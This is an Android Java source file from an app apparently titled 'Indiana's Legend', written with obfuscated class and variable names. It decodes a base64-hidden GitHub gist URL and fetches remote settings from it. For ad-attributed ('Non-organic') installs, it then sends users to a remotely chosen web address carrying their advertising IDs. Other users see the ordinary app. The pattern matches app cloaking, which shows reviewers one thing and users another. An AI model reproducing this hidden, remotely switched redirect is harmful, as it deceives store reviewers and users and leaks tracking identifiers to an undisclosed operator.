package cam.indlege.legeng.ind;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.room.Room;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import cam.indlege.legeng.ind.ifkd.Databaseinstancefourteen;

public class O {

    public static String connnon = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzM2NmIxYmY2OGU0ZTQ0YzlkMzFmZjFkOWJjNmZkNjM4L3Jhdy9JbmRpYW5hX3NfTGVnZW5k";
    public static String [] asa;
    public static String kfs = null;
    public static String ksf;
    public static int kfsf = 0;
    private static String fd;
    public static Databaseinstancefourteen lofd;

    @RequiresApi(api = Build.VERSION_CODES.O)

    public static void oo(Il il){

        new Thread(new Runnable() {
            @Override
            public void run() {
                lofd =  Room.databaseBuilder(il.getApplicationContext(),
                        Databaseinstancefourteen.class, "dvf4gvbgfg").build();


                if (lofd.daofourteen().gethowMuchWeHaveDao()>0){
                    fd = lofd.daofourteen().getlastWeDao().contentfourteen;
                    kfsf = lofd.daofourteen().gethowMuchWeHaveDao();
                }

                try {

                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(MainActivity.ddddeee(connnon)).openConnection();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    String idl = bufferedReader.readLine();
                    asa = idl.split("\\\u007C");

                    il.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Il il1 = il;
                            bif(il1);
                            didi(il1);

                                    if (kfsf >0){
                                        Intent intentds = new Intent(il.getApplicationContext(),Offff.class);
                                        intentds.putExtra("sdwq", fd);
                                        il.startActivity(intentds);
                                        il.finishAffinity();

                                    }else {

                                        new Handler().postDelayed(new Runnable() {
                                            @Override
                                            public void run() {


                                                String statusAppsFlyer = AAAAooo.lifsj;
                                                String load = null;
                                                if (statusAppsFlyer.equals(MainActivity.ddddeee("Tm9uLW9yZ2FuaWM="))){
                                                    load = asa[0] + AAAAooo.judb;
                                                    Intent intentds = new Intent(il.getApplicationContext(),Offff.class);
                                                    intentds.putExtra("sdwq",load);
                                                    il.startActivity(intentds);
                                                    il.finishAffinity();
                                                }else if(kfs != null) {
                                                    load = asa[0] + ksf;
                                                    Intent intentds = new Intent(il.getApplicationContext(),Offff.class);
                                                    intentds.putExtra("sdwq",load);
                                                    il.startActivity(intentds);
                                                    il.finishAffinity();
                                                }else {
                                                    if (asa[1].equals(MainActivity.ddddeee("Tk8="))) {
                                                        il.startActivity(new Intent(il.getApplicationContext(), MainActivity.class));
                                                        il.finishAffinity();
                                                    }else {
                                                        String strAppsFlyer = asa[1] + MainActivity.ddddeee("P2J1bmRsZT0=") + il.getPackageName() + MainActivity.ddddeee("JmFkX2lkPQ==") + AAAAooo.kiusd + MainActivity.ddddeee("JmFwcHNfaWQ9") + AAAAooo.ksd;
                                                        load = asa[0] + strAppsFlyer;
                                                        Log.d("wwww",load);
                                                        Intent intentds = new Intent(il.getApplicationContext(),Offff.class);
                                                        intentds.putExtra("sdwq",load);
                                                        il.startActivity(intentds);
                                                        il.finishAffinity();
                                                    }
                                                }
                                            }
                                        },5000);
                                    }



                        }
                    });

                }catch (Exception e){
                    il.startActivity(new Intent(il.getApplicationContext(),MainActivity.class));
                    il.finishAffinity();

                }

            }
        }).start();

    }


    private static void bif(Il il){
        FacebookSdk.setApplicationId(asa[2]);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(il.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);
    }

    private static void didi(Il il){

        AppEventsLogger.activateApp(il.getApplication());
        AppLinkData.fetchDeferredAppLinkData(il.getApplicationContext(), new AppLinkData.CompletionHandler() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData ffsfq) {

                if (ffsfq == null) {
                    ffsfq = AppLinkData.createFromActivity(il);
                }
                if (ffsfq != null) {
                    Uri fdfsf = ffsfq.getTargetUri();
                    kfs = fdfsf.getQuery();
                    ksf = MainActivity.kfdodk(kfs,il.getPackageName(), AAAAooo.kiusd,AAAAooo.ksd);

                }else {

                }

            }
        });
    }
}
